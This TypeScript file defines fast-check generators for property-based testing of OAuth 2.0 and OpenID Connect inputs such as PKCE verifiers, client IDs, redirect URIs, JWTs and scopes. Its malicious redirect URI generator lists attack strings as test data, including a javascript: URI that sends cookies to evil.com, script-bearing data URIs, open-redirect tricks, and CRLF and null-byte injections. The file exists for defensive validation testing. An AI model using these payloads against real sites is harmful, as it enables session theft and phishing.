/**
 * fast-check Custom Arbitraries for OAuth/OIDC Property-Based Testing
 *
 * RFC-compliant generators for testing OAuth 2.0 and OpenID Connect parameters.
 * These generators ensure proper test coverage of edge cases and security boundaries.
 *
 * Note: Uses fast-check v4 API (stringOf -> string with unit constraint)
 * See: https://fast-check.dev/docs/migration-guide/from-3.x-to-4.x/
 */

import * as fc from 'fast-check';

// =============================================================================
// PKCE (RFC 7636) Generators
// =============================================================================

/**
 * Valid PKCE code_verifier characters per RFC 7636
 * unreserved = ALPHA / DIGIT / "-" / "." / "_" / "~"
 */
const CODE_VERIFIER_CHARS = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~';

/**
 * RFC 7636 compliant code_verifier generator
 * Length: 43-128 characters
 * Characters: [A-Za-z0-9-._~]
 */
export const codeVerifierArb = fc.string({
  unit: fc.constantFrom(...CODE_VERIFIER_CHARS.split('')),
  minLength: 43,
  maxLength: 128,
});

/**
 * Invalid code_verifier: too short (< 43 characters)
 */
export const tooShortCodeVerifierArb = fc.string({
  unit: fc.constantFrom(...CODE_VERIFIER_CHARS.split('')),
  minLength: 1,
  maxLength: 42,
});

/**
 * Invalid code_verifier: too long (> 128 characters)
 */
export const tooLongCodeVerifierArb = fc.string({
  unit: fc.constantFrom(...CODE_VERIFIER_CHARS.split('')),
  minLength: 129,
  maxLength: 256,
});

/**
 * Code verifier with invalid characters (base64 standard instead of base64url)
 */
export const invalidCharCodeVerifierArb = fc
  .string({
    unit: fc.constantFrom(...CODE_VERIFIER_CHARS.split('')),
    minLength: 40,
    maxLength: 125,
  })
  .chain((s) =>
    fc.constantFrom('+', '/', '=', ' ', '\n', '\t', '@', '#').map((invalid) => s + invalid)
  );

// =============================================================================
// Base64URL Generators
// =============================================================================

/**
 * Base64URL character set (no padding)
 */
const BASE64URL_CHARS = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';

/**
 * Valid base64url string generator
 */
export const base64urlArb = (minLength = 1, maxLength = 256) =>
  fc.string({
    unit: fc.constantFrom(...BASE64URL_CHARS.split('')),
    minLength,
    maxLength,
  });

/**
 * Standard base64 (not URL-safe) with padding
 */
export const standardBase64Arb = (minLength = 4, maxLength = 256) =>
  fc
    .string({
      unit: fc.constantFrom(
        ...'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'.split('')
      ),
      minLength,
      maxLength,
    })
    .map((s) => {
      const padding = (4 - (s.length % 4)) % 4;
      return s + '='.repeat(padding);
    });

// =============================================================================
// Client ID Generators
// =============================================================================

/**
 * Valid client_id characters: alphanumeric, hyphens, underscores
 */
const CLIENT_ID_CHARS = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';

/**
 * Valid client_id generator (1-256 characters)
 */
export const clientIdArb = fc.string({
  unit: fc.constantFrom(...CLIENT_ID_CHARS.split('')),
  minLength: 1,
  maxLength: 256,
});

/**
 * Invalid client_id: too long
 */
export const tooLongClientIdArb = fc.string({
  unit: fc.constantFrom(...CLIENT_ID_CHARS.split('')),
  minLength: 257,
  maxLength: 512,
});

/**
 * Client ID with invalid characters
 */
export const invalidCharClientIdArb = fc
  .string({
    unit: fc.constantFrom(...CLIENT_ID_CHARS.split('')),
    minLength: 1,
    maxLength: 200,
  })
  .chain((prefix) =>
    fc
      .constantFrom('@', '#', '$', '%', '^', '&', '*', '(', ')', ' ', '\n', '日本語', 'émoji')
      .map((invalid) => prefix + invalid)
  );

// =============================================================================
// Redirect URI Generators
// =============================================================================

/**
 * Valid HTTPS redirect URI
 */
export const httpsRedirectUriArb = fc
  .tuple(
    fc.webSegment(), // subdomain or path segment
    fc.domain(),
    fc.nat({ max: 65535 }).map((n) => (n > 1024 ? `:${n}` : '')), // optional port
    fc.webPath() // path
  )
  .map(([_segment, domain, port, path]) => `https://${domain}${port}${path}`);

/**
 * Valid localhost HTTP URI (development)
 */
export const localhostRedirectUriArb = fc
  .tuple(
    fc.constantFrom('localhost', '127.0.0.1'),
    fc.integer({ min: 1024, max: 65535 }),
    fc.webPath()
  )
  .map(([host, port, path]) => `http://${host}:${port}${path}`);

/**
 * Malicious/dangerous redirect URIs for security testing
 */
export const maliciousUriArb = fc.oneof(
  // JavaScript injection
  fc.constant('javascript:alert(1)'),
  fc.constant('javascript:document.location="https://evil.com/?c="+document.cookie'),
  // Data URI
  fc.constant('data:text/html,<script>alert(1)</script>'),
  fc.constant('data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='),
  // File protocol
  fc.constant('file:///etc/passwd'),
  // FTP protocol
  fc.constant('ftp://evil.com/malware.exe'),
  // Open redirect patterns
  fc.constant('https://evil.com\\@legitimate.com'),
  fc.constant('https://legitimate.com@evil.com'),
  fc.constant('//evil.com'),
  fc.constant('/\\evil.com'),
  // Unicode/IDN homograph attacks
  fc.constant('https://googlе.com/callback'), // Cyrillic 'е'
  // Path traversal
  fc.constant('https://example.com/../../../etc/passwd'),
  // Fragment injection
  fc.constant('https://example.com/callback#token=stolen'),
  // Null byte injection
  fc.constant('https://example.com/callback\x00.evil.com'),
  // CRLF injection
  fc.constant('https://example.com/callback\r\nX-Injected: header')
);

/**
 * HTTP (non-localhost) URLs that should be rejected
 */
export const httpNonLocalhostUriArb = fc
  .tuple(
    fc.domain().filter((d) => d !== 'localhost' && d !== '127.0.0.1'),
    fc.webPath()
  )
  .map(([domain, path]) => `http://${domain}${path}`);

// =============================================================================
// State/Nonce Generators
// =============================================================================

/**
 * Valid state parameter (1-2048 characters)
 */
export const stateArb = fc.string({ minLength: 1, maxLength: 2048 });

/**
 * State that is too long
 */
export const tooLongStateArb = fc.string({ minLength: 2049, maxLength: 4096 });

/**
 * Valid nonce parameter
 */
export const nonceArb = fc.string({ minLength: 1, maxLength: 512 });

/**
 * Nonce that is too long
 */
export const tooLongNonceArb = fc.string({ minLength: 513, maxLength: 1024 });

// =============================================================================
// JWT/Token Generators
// =============================================================================

/**
 * Valid JWT structure (3 base64url parts separated by dots)
 */
export const jwtFormatArb = fc
  .tuple(
    base64urlArb(10, 100), // header
    base64urlArb(10, 200), // payload
    base64urlArb(10, 200) // signature
  )
  .map(([header, payload, signature]) => `${header}.${payload}.${signature}`);

/**
 * Invalid JWT with 2 parts
 */
export const twoPartJwtArb = fc
  .tuple(base64urlArb(10, 100), base64urlArb(10, 100))
  .map(([a, b]) => `${a}.${b}`);

/**
 * Invalid JWT with 4 parts
 */
export const fourPartJwtArb = fc
  .tuple(base64urlArb(10, 100), base64urlArb(10, 100), base64urlArb(10, 100), base64urlArb(10, 100))
  .map(([a, b, c, d]) => `${a}.${b}.${c}.${d}`);

/**
 * JWT with invalid base64url characters in parts
 */
export const malformedBase64JwtArb = fc
  .tuple(
    fc.string({
      unit: fc.constantFrom(...'ABCDE+/='.split('')),
      minLength: 10,
      maxLength: 50,
    }),
    base64urlArb(10, 50),
    base64urlArb(10, 50)
  )
  .map(([header, payload, signature]) => `${header}.${payload}.${signature}`);

// =============================================================================
// Authorization Code Generators
// =============================================================================

/**
 * Valid authorization code (32-512 characters, base64url)
 */
export const authCodeArb = base64urlArb(32, 512);

/**
 * Auth code too short
 */
export const tooShortAuthCodeArb = base64urlArb(1, 31);

/**
 * Auth code too long
 */
export const tooLongAuthCodeArb = base64urlArb(513, 1024);

/**
 * Auth code with invalid characters (standard base64)
 */
export const invalidAuthCodeArb = standardBase64Arb(32, 512);

// =============================================================================
// Unicode/Control Character Generators
// =============================================================================

/**
 * String with control characters (for security testing)
 */
export const controlCharStringArb = fc
  .string({ minLength: 10, maxLength: 50 })
  .chain((s) =>
    fc.constantFrom('\x00', '\x01', '\x1f', '\x7f', '\r', '\n', '\t').map((ctrl) => s + ctrl)
  );

/**
 * String with null byte (for injection testing)
 */
export const nullByteStringArb = fc
  .tuple(fc.string({ minLength: 10, maxLength: 50 }), fc.string({ minLength: 1, maxLength: 10 }))
  .map(([prefix, suffix]) => prefix + '\x00' + suffix);

/**
 * Unicode string with various scripts
 * Note: unicodeString is removed in fast-check v4, use string({ unit: 'binary' }) instead
 */
export const unicodeStringArb = fc.oneof(
  fc.string({ unit: 'binary', minLength: 1, maxLength: 100 }),
  fc.constant('日本語テスト'),
  fc.constant('тест'), // Cyrillic
  fc.constant('🔐🔑🛡️'), // Emoji
  fc.constant('مرحبا'), // Arabic
  fc.constant('测试') // Chinese
);

// =============================================================================
// Scope Generators
// =============================================================================

/**
 * Valid OIDC standard scopes
 */
export const standardScopeArb = fc
  .shuffledSubarray(['openid', 'profile', 'email', 'address', 'phone', 'offline_access'], {
    minLength: 1,
    maxLength: 6,
  })
  .map((scopes) => {
    // Ensure openid is always included
    if (!scopes.includes('openid')) {
      scopes.unshift('openid');
    }
    return scopes.join(' ');
  });

/**
 * Custom scope (alphanumeric, underscore, hyphen, colon, period)
 */
export const customScopeArb = fc.string({
  unit: fc.constantFrom(
    ...'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-:.'.split('')
  ),
  minLength: 1,
  maxLength: 64,
});

/**
 * AI scope (ai:* namespace)
 */
export const aiScopeArb = fc.oneof(
  fc.constant('ai:read'),
  fc.constant('ai:write'),
  fc.constant('ai:execute'),
  fc.constant('ai:admin'),
  fc
    .string({
      unit: fc.constantFrom(...'abcdefghijklmnopqrstuvwxyz0123456789_:'.split('')),
      minLength: 1,
      maxLength: 32,
    })
    .map((s) => `ai:${s}`)
);

/**
 * Reserved namespace scope (should be rejected for custom scopes)
 */
export const reservedNamespaceScopeArb = fc.oneof(
  fc.constant('system:internal'),
  fc.constant('internal:debug'),
  fc.constant('authrim:admin'),
  fc.string({ minLength: 1, maxLength: 20 }).map((s) => `system:${s}`),
  fc.string({ minLength: 1, maxLength: 20 }).map((s) => `internal:${s}`),
  fc.string({ minLength: 1, maxLength: 20 }).map((s) => `authrim:${s}`)
);
